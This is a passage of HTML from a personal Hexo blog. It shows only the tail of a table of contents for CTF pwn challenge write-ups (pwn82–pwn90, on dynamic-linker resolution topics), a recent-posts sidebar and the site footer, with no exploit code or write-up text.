href="#pwn82"><span class="toc-number">1.48.</span> <span class="toc-text">pwn82</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dl-runtime-resolve%E5%87%BD%E6%95%B0%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%851"><span class="toc-number">1.48.1.</span> <span class="toc-text">_dl_runtime_resolve函数知识补充1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#reloc-index%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.48.2.</span> <span class="toc-text">reloc_index知识补充</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#relro%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.48.3.</span> <span class="toc-text">relro知识回顾</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DT-STRTAB%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.48.4.</span> <span class="toc-text">DT_STRTAB知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn83"><span class="toc-number">1.49.</span> <span class="toc-text">pwn83</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#stage1"><span class="toc-number">1.49.1.</span> <span class="toc-text">stage1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage2"><span class="toc-number">1.49.2.</span> <span class="toc-text">stage2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dl-runtime-resolve%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%852"><span class="toc-number">1.49.3.</span> <span class="toc-text">_dl_runtime_resolve知识补充2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage3"><span class="toc-number">1.49.4.</span> <span class="toc-text">stage3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage4"><span class="toc-number">1.49.5.</span> <span class="toc-text">stage4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage5"><span class="toc-number">1.49.6.</span> <span class="toc-text">stage5</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#stage6"><span class="toc-number">1.49.7.</span> <span class="toc-text">stage6</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%AE%9E%E7%8E%B0%E8%84%9A%E6%9C%AC"><span class="toc-number">1.49.8.</span> <span class="toc-text">自动实现脚本</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn84"><span class="toc-number">1.50.</span> <span class="toc-text">pwn84</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn85"><span class="toc-number">1.51.</span> <span class="toc-text">pwn85</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#DT-SYMENT-DT-RELAENT%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.51.1.</span> <span class="toc-text">DT_SYMENT &amp; DT_RELAENT知识补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn86"><span class="toc-number">1.52.</span> <span class="toc-text">pwn86</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn87"><span class="toc-number">1.53.</span> <span class="toc-text">pwn87</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn88"><span class="toc-number">1.54.</span> <span class="toc-text">pwn88</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn89"><span class="toc-number">1.55.</span> <span class="toc-text">pwn89</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn90"><span class="toc-number">1.56.</span> <span class="toc-text">pwn90</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reference2"><span class="toc-number">1.57.</span> <span class="toc-text">Reference2</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/18/ciscn2024-%C3%97-ccb/" title="ciscn2024 × ccb">ciscn2024 × ccb</a><time datetime="2024-12-18T05:10:27.000Z" title="发表于 2024-12-18 13:10:27">2024-12-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/06/%E6%AF%9B%E6%A6%82%E5%A4%8D%E4%B9%A0/" title="毛概复习">毛概复习</a><time datetime="2024-12-06T13:59:03.000Z" title="发表于 2024-12-06 21:59:03">2024-12-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/14/BIM-CIM%E8%AE%BE%E8%AE%A1/" title="BIM/CIM设计">BIM/CIM设计</a><time datetime="2024-11-14T02:10:37.000Z" title="发表于 2024-11-14 10:10:37">2024-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/12/%E9%B9%8F%E5%9F%8E%E6%9D%AF2024/" title="鹏城杯2024">鹏城杯2024</a><time datetime="2024-11-12T02:38:26.000Z" title="发表于 2024-11-12 10:38:26">2024-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84/" title="网鼎杯2024青龙组">网鼎杯2024青龙组</a><time datetime="2024-11-11T15:21:22.000Z" title="发表于 2024-11-11 23:21:22">2024-11-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By zx</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>